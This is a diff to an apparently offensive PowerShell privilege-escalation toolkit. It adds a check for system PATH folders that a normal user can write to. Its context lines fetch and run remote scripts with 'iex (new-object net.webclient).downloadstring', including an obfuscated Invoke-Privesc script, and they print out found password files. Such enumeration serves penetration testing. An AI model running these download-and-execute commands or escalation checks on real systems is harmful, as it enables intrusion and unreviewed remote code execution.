@@ -1756,6 +1756,30 @@ function privescmodules
      if ($i -eq 0) { Write "Files not found."}
      else {$out = get-content $currentPath\LocalPrivEsc\Passwordfiles.txt; $out }
     
+    If (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Write-Warning "This script will not function with administrative privileges. Please run as a normal user."
+    Break
+}
+Write-Host -ForegroundColor Yellow 'Looking for Writable PATH variable folders:'
+#Credit here https://gist.github.com/wdormann/eb714d1d935bf454eb419a34be266f6f 
+$outfile = "acltestfile"
+set-variable -name paths -value (Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH).path.Split(";")
+Foreach ($path in $paths) {
+    Try {
+        [io.file]::OpenWrite("$path\$outfile").close()
+        Write-Warning "I can write to '$path'"
+	echo $path >> $currentPath\LocalPrivEsc\Writable_PATH_Variable_Folder.txt
+        $insecure = 1
+    }
+    Catch {}
+}
+If ($insecure -eq 1) {
+  Write-Warning "Any directory above is in the system-wide directory list, but can also be written to by the current user."
+  Write-Host "This can allow privilege escalation." -ForegroundColor Red
+} Else {
+  Write-Host "Looks good! No system path can be written to by the current user." -ForegroundColor Green
+}
+    
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/IkeextCheck.ps1')
     Invoke-IkeextCheck >> "$currentPath\Vulnerabilities\IkeExtVulnerable.txt"
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/Invoke-Privesc.ps1')
